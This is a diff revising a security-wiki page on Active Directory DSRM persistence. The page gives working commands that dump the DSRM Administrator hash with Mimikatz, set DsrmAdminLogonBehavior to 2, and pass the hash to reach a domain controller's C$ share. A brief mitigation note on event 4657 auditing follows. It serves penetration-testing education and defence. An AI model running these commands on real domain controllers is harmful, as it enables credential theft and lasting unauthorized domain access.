@@ -4,38 +4,44 @@
 
 ## Basic Information
 
-There is a **local administrator** account inside each **DC**. Having admin privileges in this machine you can use mimikatz to **dump the local Administrator hash**. Then, modifying a registry to **activate this password** so you can remotely access to this local Administrator user.\
-First we need to **dump** the **hash** of the **local Administrator** user inside the DC:
+Every domain controller has a Directory Services Restore Mode (DSRM) administrator account. Its password is set during domain-controller promotion and is separate from Active Directory domain accounts.<sup>[[1]](#references)</sup>
 
-```bash
+An attacker with administrative control of a domain controller can dump the local SAM database and recover the DSRM Administrator NTLM hash. The following Mimikatz command performs that operation:<sup>[[2]](#references)</sup>
+
+```powershell
 Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
 ```
 
-Then we need to check if that account will work, and if the registry key has the value "0" or it doesn't exist you need to **set it to "2"**:
+By default, the DSRM account is intended for restore mode. Setting `DsrmAdminLogonBehavior` to `2` permits this local account to authenticate while the domain controller is running normally. Check the value before changing it:<sup>[[2]](#references)[[3]](#references)</sup>
 
-```bash
-Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior #Check if the key exists and get the value
-New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD #Create key with value "2" if it doesn't exist
-Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2  #Change value to "2"
+```powershell
+$lsaPath = 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa'
+$current = Get-ItemProperty -Path $lsaPath -Name DsrmAdminLogonBehavior -ErrorAction SilentlyContinue
+
+if ($null -eq $current) {
+    New-ItemProperty -Path $lsaPath -Name DsrmAdminLogonBehavior -Value 2 -PropertyType DWORD
+} else {
+    Set-ItemProperty -Path $lsaPath -Name DsrmAdminLogonBehavior -Value 2
+}
 ```
 
-Then, using a PTH you can **list the content of C$ or even obtain a shell**. Notice that for creating a new powershell session with that hash in memory (for the PTH) **the "domain" used is just the name of the DC machine:**
+The recovered hash can then be used in a pass-the-hash session to access resources such as the administrative `C$` share. For this local account, use the domain controller's computer name as the `/domain` value:<sup>[[3]](#references)</sup>
 
-```bash
+```powershell
 sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
-#And in new spawned powershell you now can access via NTLM the content of C$
+# In the new PowerShell process, access C$ over NTLM.
 ls \\dc-host-name\C$
 ```
 
-More info about this in: [https://adsecurity.org/?p=1714](https://adsecurity.org/?p=1714) and [https://adsecurity.org/?p=1785](https://adsecurity.org/?p=1785)<sup>[[1]](#references)[[2]](#references)</sup>
-
 ## Mitigation
 
-- Event ID 4657 - Audit creation/change of `HKLM:\System\CurrentControlSet\Control\Lsa DsrmAdminLogonBehavior`
+- Audit changes to `HKLM:\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior`. Security event 4657 records a registry value modification when the key's SACL is configured to audit **Set Value** operations.<sup>[[4]](#references)</sup>
 
 ## References
 
-- [1] [Sneaky Active Directory Persistence #11: Directory Service Restore Mode (DSRM)](https://adsecurity.org/?p=1714)
-- [2] [Sneaky Active Directory Persistence #13: DSRM Persistence v2](https://adsecurity.org/?p=1785)
+- [1] [Microsoft: Reset the Directory Services Restore Mode administrator password](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/reset-directory-services-restore-mode-admin-pwd)
+- [2] [ADSecurity: Sneaky Active Directory Persistence #11 — Directory Service Restore Mode](https://adsecurity.org/?p=1714)
+- [3] [ADSecurity: Sneaky Active Directory Persistence #13 — DSRM Persistence v2](https://adsecurity.org/?p=1785)
+- [4] [Microsoft: Event 4657 — A registry value was modified](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4657)
 
 {{#include ../../banners/hacktricks-training.md}}
